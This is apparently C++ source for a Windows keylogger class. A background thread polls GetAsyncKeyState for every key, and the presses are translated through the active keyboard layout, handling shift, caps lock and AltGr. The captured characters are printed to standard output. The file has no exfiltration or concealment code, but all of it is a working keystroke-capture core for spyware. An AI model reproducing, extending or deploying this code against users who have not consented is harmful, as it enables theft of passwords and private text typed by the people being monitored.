#include "keylogger.h"

Keylogger::Keylogger() 
	: keylog(nullptr) 
{
	std::locale::global(std::locale(""));
}

void Keylogger::startKeylog() {
	auto listener = [this]() {
		while (isKeylogging()) {
			setKeysState();
			handleOutput();
			std::this_thread::sleep_for(polling);
		}
	};
	keylog = new std::thread(listener);
}
void Keylogger::stopKeylog() {
	std::thread* temp = keylog;
	keylog = nullptr;
	temp->join();
	delete temp;
}
bool Keylogger::isKeylogging() {
	return keylog != nullptr;
}

void Keylogger::setKeysState() {
	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
		setKeyState(i, GetAsyncKeyState(i));
	}
}
void Keylogger::handleOutput() {
	auto& keys = getKeys();
	auto& keysLayoutOuter = layout->pVkToWcharTable;

	bool caps = keys[VK_CAPITAL].isToggled();
	bool shift = keys[VK_SHIFT].isPressed();
	bool upper = caps != shift;
	bool ctrl = keys[VK_CONTROL].isPressed();
	bool alt = keys[VK_MENU].isPressed();
	bool altgr = ctrl && alt;
	
	for (int j = 0; keysLayoutOuter[j].pVkToWchars; j++) {
		auto& keysLayout = keysLayoutOuter[j];

		for (auto keyLayout = keysLayout.pVkToWchars; 
			keyLayout->VirtualKey; 
			keyLayout = (VK_TO_WCHARS1*)(((PBYTE)keyLayout) + keysLayout.cbSize))
		{
			const auto& key = keys[keyLayout->VirtualKey];

			if (!key.isAlternating() || !key.isPressed() || 
				key.value == VK_RETURN || key.value == VK_BACK || 
				key.value == VK_TAB)
			{
				continue;
			}

			if (altgr) {
				if (keysLayout.nModifications >= 4 && ((keyLayout->Attributes & CAPLOKALTGR && upper) || shift)) {
					std::wcout << keyLayout->wch[3];
				}
				else if (keysLayout.nModifications >= 3 && !shift) {
					std::wcout << keyLayout->wch[2];
				}
			}
			else {
				if (keysLayout.nModifications >= 2 && ((keyLayout->Attributes & CAPLOK && upper) || shift)) {
					std::wcout << keyLayout->wch[1];
				}
				else {
					std::wcout << keyLayout->wch[0];
				}
			}
			std::wcout.clear();
		}
	}
}

